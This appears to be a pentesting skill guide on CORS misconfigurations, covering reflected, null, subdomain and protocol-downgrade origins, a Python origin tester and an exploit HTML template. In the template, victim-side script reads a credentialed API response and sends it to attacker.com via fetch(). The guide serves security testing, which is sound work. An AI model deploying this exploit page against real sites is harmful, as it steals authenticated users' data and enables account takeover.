---
name: cors
description: Cross-Origin Resource Sharing misconfiguration testing
version: 1.0.0
tags: [configuration, cors, A05:2021, API8:2023]
---

# CORS Misconfiguration Testing

## Overview
CORS misconfigurations can allow malicious websites to steal data from authenticated users.

## Vulnerability Types

### 1. Wildcard Origin (High)
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true  # Won't work but indicates intent
```

### 2. Reflected Origin (Critical)
```
# Request:
Origin: https://evil.com

# Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

### 3. Null Origin (High)
```
# Request:
Origin: null

# Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

### 4. Subdomain Matching Bypass
```
# If target.com is trusted, try:
Origin: https://evil.target.com
Origin: https://targetevilsite.com
Origin: https://target.com.evil.com
```

### 5. Protocol Downgrade
```
# If https://target.com is trusted, try:
Origin: http://target.com
```

## Testing Methodology

### 1. Send Request with Origin Header
```
GET /api/sensitive HTTP/1.1
Host: target.com
Origin: https://evil.com
```

### 2. Check Response Headers
- `Access-Control-Allow-Origin`
- `Access-Control-Allow-Credentials`
- `Access-Control-Allow-Methods`

### 3. Test Origin Variations
```
https://evil.com
https://target.com.evil.com
https://evil.target.com
https://evil-target.com
null
```

## PoC Template
```python
import requests

def test_cors(url):
    """Test for CORS misconfiguration"""
    
    test_origins = [
        "https://evil.com",
        "null",
        "https://target.com.evil.com",
    ]
    
    vulnerable = False
    
    for origin in test_origins:
        headers = {"Origin": origin}
        r = requests.get(url, headers=headers)
        
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        
        if origin in acao or acao == origin:
            print(f"[+] Origin {origin} reflected!")
            if acac.lower() == "true":
                print("[!] CRITICAL: Credentials allowed!")
                vulnerable = True
    
    return vulnerable


# Exploit PoC (for victim to visit)
EXPLOIT_HTML = '''
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://target.com/api/sensitive", true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
        // Exfiltrate data
        fetch("https://attacker.com/steal?data=" + btoa(xhr.responseText));
    }
};
xhr.send();
</script>
</body>
</html>
'''
```

## Impact
- Steal sensitive user data
- Perform actions as victim
- Session hijacking
- Account takeover
